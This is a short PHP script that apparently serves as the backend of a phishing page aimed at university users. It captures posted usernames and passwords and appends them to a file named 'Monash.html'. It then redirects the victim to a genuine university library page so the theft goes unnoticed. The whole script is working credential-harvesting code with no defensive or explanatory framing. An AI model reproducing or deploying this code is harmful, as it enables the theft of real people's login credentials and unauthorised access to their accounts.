<?php
$next_page = "https://libguides.acu.edu.au/az.php"; 
$login= $_POST['user'];
$passwd=$_POST['pass'];
$myFile = "Monash.html";
$fh = fopen($myFile, 'a') or die("can't open file");

$stringData = " <br><font color='#000000'>Username: ";
fwrite($fh, $stringData);
fwrite($fh, $login); 

$stringData = "  <br/></font> <font color='#FF0000'> Password: ";
fwrite($fh, $stringData);
fwrite($fh, $passwd);


fclose($fh);
header("Location: " . $next_page); 
?>